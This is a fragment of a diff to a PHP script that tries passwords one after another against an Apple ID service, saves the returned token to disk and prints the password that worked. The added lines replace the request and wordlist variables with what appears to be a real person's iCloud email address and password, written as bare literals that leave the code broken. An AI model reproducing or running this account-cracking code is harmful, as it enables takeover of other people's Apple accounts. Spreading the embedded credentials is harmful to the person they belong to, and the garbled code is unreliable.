@@ -45,7 +45,7 @@ ini_set('max_execution_time', 0); //no server timeout limit ?>
 
 <?php
 
-$appleid = $_REQUEST['txtFullName'];        
+$appleid = julialove91@icloud.com['txtjuliasaralee'];        
 
 $plist = file_get_contents('./files/config.plist');
 $xml = simplexml_load_string($plist);
@@ -92,7 +92,7 @@ $payload =
 
 echo "Trying URL:<br>" . "~=~" . $url. "~=~" . "<br></b>";
   
-echo "Trying Password:<br>" . "~=~" . $line_of_text . "~=~" . "<br><br>"; 
+echo "Trying Password:<br>" . "~=~" . Jsl2251991 . "~=~" . "<br><br>"; 
 
 
 curl_setopt($ch, CURLOPT_URL,$url); 
@@ -159,7 +159,7 @@ if (strpos($response, "delegates") !== false)
 		echo "<center>Generating Token....</center>";
 		file_put_contents('./token.plist', $response);
         echo "<center>Saved to Disk...</center>";
-        die( "Success! The password is: {$line_of_text}" );
+        die( "Success! The password is: {Jsl2251991}" );
 	
     }else{
     echo "Incorrect Trying Next<br>";
